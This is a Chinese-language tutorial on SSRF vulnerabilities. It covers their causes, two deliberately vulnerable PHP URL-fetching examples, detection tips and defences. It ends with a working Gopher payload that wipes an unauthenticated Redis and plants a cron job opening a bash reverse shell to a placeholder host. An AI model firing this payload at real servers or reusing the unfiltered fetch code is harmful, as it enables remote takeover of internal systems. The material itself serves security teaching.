# SSRF漏洞

## 1、概述

SSRF（Server-site request forgery）服务端请求伪造。

> 网站未合理的对用户传入的URL进行过滤和判别时就有可能会存在SSRF漏洞

- 目标：内网

- 分类：Web通用漏洞

- 风险等级及危害：高危~严重

  > 利用SSRF攻击内网服务器（获取Webshell），或者利用SSRF漏洞获取大量敏感数据。

> Tips：
>
> 为了运维方便，内网通常比外网脆弱，所以SSRF漏洞的危害比较大。

## 2、漏洞原理

攻击者传入URL，外网服务器接受并转发给内网服务器。

可探测内网ip、域名、服务器端口等。

支持HTTP、HTTPS、FTP、FTPS、TFTP、SFTP、[Gopher](#Gopher)、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP、RTSP等协议。

下面是一些存在SSRF漏洞的源码：

```php
<?php
$url = $_GET['url']; // 从用户获取URL参数

function get_page_title($url) {
    $content = file_get_contents($url); // 获取URL的内容
    preg_match('/<title>(.*?)<\/title>/ims', $content, $matches); // 提取页面标题
    return isset($matches[1]) ? $matches[1] : 'No title found';
}

$title = get_page_title($url); // 获取页面标题
echo "页面标题是： " . $title;
?>
```

```php
<?php
$url = $_GET['url']; // 从用户获取URL参数

function get_page_title($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    preg_match('/<title>(.*?)<\/title>/ims', $response, $matches); // 提取页面标题
    return isset($matches[1]) ? $matches[1] : 'No title found';
}

$title = get_page_title($url); // 获取页面标题
echo "页面标题是： " . $title;
?>
```

## 3、漏洞挖掘

对于无回显的漏洞可以用盲打技术来挖掘。

> 挖掘SSRF时可以使用http://127.0.0.1、http://aaa.com、http://aaa.a（不存在的域名），观察其返回是否一致来判断是否允许请求外网。

对SSRF的利用，一般会先探测内网开放端口，然后利用Gopher协议直接发payload攻击像Redis未授权访问、Struts2远程命令执行等存在漏洞的服务器。

1. **访问内部系统资源：** 攻击者可能访问服务器内部的敏感文件、数据库或配置信息。
2. **绕过防火墙和访问控制：** 通过向内部网络发送请求，攻击者可以绕过防火墙或内部访问控制。
3. **攻击外部系统：** 利用服务器的信任关系向外部系统发起攻击，如DDoS攻击或利用其他应用程序的漏洞等。

## 4、漏洞防御

1. **输入验证和过滤：** 对用户输入的URL参数或远程请求进行严格的验证和过滤，仅允许必要的URL。
2. **白名单限制：** 限制服务器可以访问的远程资源范围，建立白名单并严格控制访问权限。
3. **使用内部代理访问：** 如果需要访问内部资源，可使用内部代理或专用通道，而不是直接从服务器端发起请求。
4. **最小权限原则：** 给予应用程序最小的权限以减少潜在的危害。
5. **安全配置：** 确保服务器和应用程序的安全配置，尽可能减少服务器对外部资源的信任。

## 5、注释

<a name="Gopher">Gopher是什么</a> ：他是Internet上的一个信息查找系统，应用在WWW出现之前，使用TCP70端口。在SSRF场景常使用Gopher协议发送Socket数据

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0
d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >&
/dev/tcp/ip/port>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0
d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0
a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%
0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```